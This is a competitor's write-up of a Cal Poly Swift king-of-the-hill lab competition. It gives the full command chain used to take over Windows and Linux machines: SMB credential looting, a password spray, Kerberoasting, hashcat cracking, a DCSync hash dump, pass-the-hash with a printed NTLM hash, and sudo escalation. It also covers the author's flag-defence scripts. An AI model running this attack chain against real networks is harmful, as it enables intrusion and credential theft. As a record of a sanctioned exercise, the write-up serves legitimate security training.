# Cal Poly Swift KOTH - Write-Up

---

## 1. Overview of the Competition

This KOTH competition was a purple team event set up by the amazing Cal Poly Swift. Competitors would log in remotely to a Kali machine to attack 6 machines, gain root, plant their flag, and defend their flags and services from other hackers trying to plant theirs.

Due to us not having direct access to the environment, we had to use SSH tunneling to access things like the websites, set up BloodHound, and more.

<img width="680" height="801" alt="image" src="https://github.com/user-attachments/assets/5127f953-ef93-4e30-b15e-df02a568e3a3" />

This was the competition environment; each machine had a scored service which was either WinRM (port 5895/5896) or SSH (port 22). This amounted to 6 total scored services.

In order to get scored, you had to keep your services running and secured while maintaining your flag in one of the specified file locations:

* **Linux:** `/root/flag.txt`
* **Windows:** `\Users\Administrator\Desktop\flag.txt`

Also, for the sake of fun, you couldn't change the root/Administrator password.

There were also trivia questions that would give us points if we answered them correctly and fast enough.

---

At the start, I went ahead and tried to gain access to a Linux machine. However, after the first hour, I switched to Windows, so I will go over my attack path for Windows first.

---

## Attacking Windows

To start off with Windows, I performed an Nmap scan to see what ports were open.

```bash
nmap -sC -sV -T5 10.109.124.214
```

<img width="1227" height="938" alt="Screenshot 2025-12-01 000733" src="https://github.com/user-attachments/assets/f31fec3b-c64e-416d-8f33-67847c29d8ed" />

In this screenshot, I was able to see that LDAP and Kerberos were open, as well as the domain name, which we needed for our first trivia question.

At this point, I was stuck because I thought I needed credentials to get any useful information out of the services. That was until Trivia Question 2!

<img width="1020" height="285" alt="image" src="https://github.com/user-attachments/assets/055aeaf4-60ab-4ca3-a580-80ca98580bdf" />

This question allowed me to finally start chipping away at Windows.

First, I ran this command to find all SMB shares on the machine:

```bash
smbclient -L 10.109.124.232
```

<img width="637" height="239" alt="image" src="https://github.com/user-attachments/assets/bc822165-d897-4bc2-8d6a-25da91c2514e" />

After getting a look at the shares, I instantly suspected that `Data` was the share with plaintext credentials, so I used the following command to log in. When I logged in, I found the file and sent it to my home directory with these two commands:

```bash
smbclient //10.109.124.232/Data -N
ls
get creds.txt
```

<img width="803" height="347" alt="image" src="https://github.com/user-attachments/assets/500b8fc0-846d-4adb-903e-9292d2d16377" />

Finally, after I retrieved the file, I obtained my credentials.

<img width="227" height="194" alt="image" src="https://github.com/user-attachments/assets/b9ad7189-c87f-4892-92c4-6f024a6f663e" />

With these credentials, I was able to set up a password spray attack to see what accounts worked.

```bash
nxc smb 10.109.124.214 10.109.124.241 10.109.124.232 -u users.txt -p passwords.txt
```

<img width="586" height="423" alt="image" src="https://github.com/user-attachments/assets/66e7f2a0-e7fb-49ad-9e61-f109146c1a8a" />

After I found a valid login, I used it to perform a Kerberoast attack on the Domain Controller (since Kerberos was open).

```bash
impacket-GetUserSPNs -request -dc-ip 10.109.124.214 kingofthehill.local/ghostadmin:Resurrect1 > output.txt
```

<img width="641" height="107" alt="image" src="https://github.com/user-attachments/assets/ee540bdc-9618-469c-a4ab-5b6e5ee80eb8" />

Now that I had the Kerberos hashes, it was time to crack them with Hashcat.

```bash
hashcat -a 0 output.txt /usr/share/wordlists/rockyou.txt.gz
```

<img width="800" height="103" alt="image" src="https://github.com/user-attachments/assets/ab31f31a-e87d-42b7-b568-83aced193cec" />

<img width="800" height="103" alt="image" src="https://github.com/user-attachments/assets/b9dbda38-b941-48a3-8307-b5f56aa8e237" />

With my new credentials, I went ahead and ran `nxc` again to see what I could do with them.

```bash
nxc smb 10.109.124.214 10.109.124.241 10.109.124.232 -u peggy -p password2
```

<img width="805" height="412" alt="Screenshot 2025-12-04 014258" src="https://github.com/user-attachments/assets/5b20ed1d-55cb-478a-becd-4ea188974875" />

This was good news. The `(Pwn3d!)` text meant that my account had some sort of admin privileges, and in this case, my new account was a Domain Admin.

With these credentials, I performed a DCSync attack on the Domain Controller so I could get a dump of all NTLM hashes.

```bash
impacket-secretsdump kingofthehill.local/peggy:password2@10.109.124.214 -just-dc
```

<img width="867" height="229" alt="image" src="https://github.com/user-attachments/assets/de9afc0e-679a-42a3-a264-e61782918247" />

NTLM hashes are special; instead of using Hashcat to find the admin password, you can use something called **Pass-The-Hash** to log in as Administrator. We will be doing that with `evil-winrm`.

```bash
evil-winrm -i 10.109.124.214 -u Administrator -H 5c5aefbcab1053c010bc9c1cfcc6f95d
```

<img width="711" height="272" alt="image" src="https://github.com/user-attachments/assets/b7d12dd9-a692-41c1-bb92-4252fd2ab4d0" />

---

## Defending Windows
Once I gained admin access, I had to plant my flag and secure the machine so other hackers couldn't steal it. At first, I used a simple `echo` command and pushed the output into the flag. Eventually, an attacker stole my box, so I wrote a looping PowerShell script that would: check if the file was there, put it back if missing, and make it Read-Only/Hidden.

```powershell
echo "FLAG-S3X7Q5K8M2T9R4BL" > C:\Users\Administrator\Desktop\flag.txt
# ------------------------------------
$flag = "FLAG-S3X7Q5K8M2T9R4BL"
$path = "C:\Users\Administrator\Desktop\flag.txt"

while($true) {
    # Check if the file content has changed
    $current = Get-Content $path -ErrorAction SilentlyContinue
    if ($current -ne $flag) {
        # If changed/deleted, write it back immediately
        echo $flag > $path
        # Lock it (Read-only + Hidden)
        attrib +r +h $path
        Write-Host "Flag restored!"
    }
    Start-Sleep -Seconds 2
}
```

<img width="800" height="413" alt="image" src="https://github.com/user-attachments/assets/5875fcd0-8a7c-448a-ba70-7eebca649278" />

Somehow the attacker was still able to steal my flag, and I had to figure out a way to get it back. One thing I knew is that we couldn't delete files, so the only way was to overwrite it. My script was partially flawed, but for a quick fix, I just removed the attributes and then ran my script again.

```powershell
attrib -r -h -s C:\Users\Administrator\Desktop\flag.txt
```

<img width="1007" height="306" alt="image" src="https://github.com/user-attachments/assets/0c55e992-6576-4a5a-a5b7-85263205a810" />

After that, I changed the passwords of the Domain Admin accounts that I used to get the NTLM hash. Since I couldn't change the Administrator password, I had to remediate my path to admin so no one else could use it.

```bash
net user peggy SUPER_L0NG_PASS123!
# Checking if the hash dump still works (it shouldn't):
impacket-secretsdump kingofthehill.local/peggy:password2@10.109.124.214
```

<img width="714" height="302" alt="image" src="https://github.com/user-attachments/assets/87319f8f-d6a0-4a34-bead-28ed47a859c9" />

<img width="714" height="236" alt="image" src="https://github.com/user-attachments/assets/3da1b254-e231-43f6-99c9-59c994d49f30" />

Finally, when that was over, I went ahead and did the same on the remaining Windows machines.

<img width="358" height="18" alt="image" src="https://github.com/user-attachments/assets/2b5f2520-f3ff-4c1b-aaee-a602416aa17b" />

---

## Attacking Linux

After I claimed all of the Windows boxes, I thought about using some of the credentials that I gained from the Windows machines, and luckily, I got a hit! But soon after I logged in, I got kicked off by the person defending the machine.

<img width="1076" height="457" alt="image" src="https://github.com/user-attachments/assets/6d677a74-ad4e-4287-92e0-a983072058ab" />

<img width="637" height="38" alt="image" src="https://github.com/user-attachments/assets/b319378f-f6c2-49cf-be80-8fdf72a32841" />

At that point, I decided to log back in and try to get LinPEAS (a Linux privilege escalation tool) running.

```bash
wget [https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh)
chmod +x linpeas.sh
./linpeas.sh
```

While it was running, I found that the sudoers file was misconfigured, so I was able to run admin credentials without an admin password.

<img width="1354" height="160" alt="image" src="https://github.com/user-attachments/assets/7e82dd93-4ff5-4aff-808e-6b9f6aec5e22" />

This was because of `(ALL : ALL) NOPASSWD: ALL`. This meant that everyone could run sudo without valid access, and with that, I did `sudo bash` to become root.

<img width="234" height="40" alt="image" src="https://github.com/user-attachments/assets/2997b3d8-8297-4c5a-9b6e-ce6ab38f2fbe" />

---

## Defending Linux

When I gained admin access, I planted my flag using:
```bash
echo "flag" > /root/flag.txt
```
I then made it immutable with:
```bash
chattr +i /root/flag.txt
```
However, I forgot to kick the current user out of the session and then got locked out myself.

<img width="590" height="71" alt="image" src="https://github.com/user-attachments/assets/b8c4e07f-db9a-4066-9b80-ce79427095eb" />

Before I got locked out, I used the `w` or `who` command to see who was logged into the machine. I saw `bobby` (the user I used to gain root) and `pr0pane3`. The plan from then on was to get access to another machine and remove the current user from the system.

<img width="685" height="94" alt="image" src="https://github.com/user-attachments/assets/4935b4b7-a4f3-4ece-b612-a48a940b01f6" />

I was able to use the `bobby` user to log into `hankcore` via SSH. Once in, I privilege escalated to root using `sudo bash` just like I did on the previous machine.

Upon checking the active users with the `who` command, I spotted a rival hacker named `gary` who was actively logged in on multiple terminals (`pts/1` and `pts/2`).

<img width="771" height="514" alt="image" src="https://github.com/user-attachments/assets/16e481bf-895e-4a76-808d-c31b33971532" />

I immediately attempted to remove his account using `userdel gary`, but the command failed because he had active processes running. To fix this, I went into "Incident Response" mode and used `pkill -9` to forcefully terminate his specific TTY sessions and process IDs. Once his connections were severed, I was free to delete his account and secure the box.

---

## Conclusion

In the end, these were the machines that I had under my control.

<img width="684" height="727" alt="Screenshot 2025-11-30 190122" src="https://github.com/user-attachments/assets/baa5139b-120f-4c5c-81f1-a09b8ef4e825" />

This was the most that I had at one time.

<img width="661" height="690" alt="image" src="https://github.com/user-attachments/assets/8f707d79-c624-40aa-b316-1a726a604abf" />

Overall, I ended in **2nd place** and had a great time competing in such a unique and fun competition.
